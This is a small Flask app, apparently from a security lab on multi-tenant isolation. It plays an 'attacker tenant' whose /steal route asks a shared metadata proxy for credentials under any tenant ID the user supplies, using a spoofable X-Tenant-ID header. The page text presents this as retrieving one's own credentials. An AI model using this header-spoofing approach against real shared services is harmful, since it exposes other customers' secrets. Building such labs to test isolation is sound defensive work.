"""Tenant B — attacker tenant trying to access tenant A's resources."""
import os, urllib.request
from flask import Flask, request, render_template_string

app = Flask(__name__)
SHARED = "http://shared:5000"

HTML="""<!DOCTYPE html><html><head><title>Tenant B Console</title></head><body>
<h1>Tenant B — Metadata Console</h1>
<p>Access the shared metadata proxy to retrieve your tenant credentials.</p>
<form method=get action=/steal>
<label>Tenant ID: <input name=tenant placeholder="tenant-b"></label>
<button>Get Credentials</button></form>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML,output="Enter a tenant ID to retrieve credentials")

@app.route("/steal")
def steal():
    tenant = request.args.get("tenant", "")
    if not tenant:
        return render_template_string(HTML,output="Error: tenant parameter required")
    try:
        req = urllib.request.Request(f"{SHARED}/metadata/credentials",
            headers={"X-Tenant-ID": tenant})
        r = urllib.request.urlopen(req, timeout=5)
        return render_template_string(HTML,output=f"[+] Credentials for {tenant}:\n{r.read().decode()}")
    except Exception as e:
        return render_template_string(HTML,output=f"[-] Error: {e}")

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
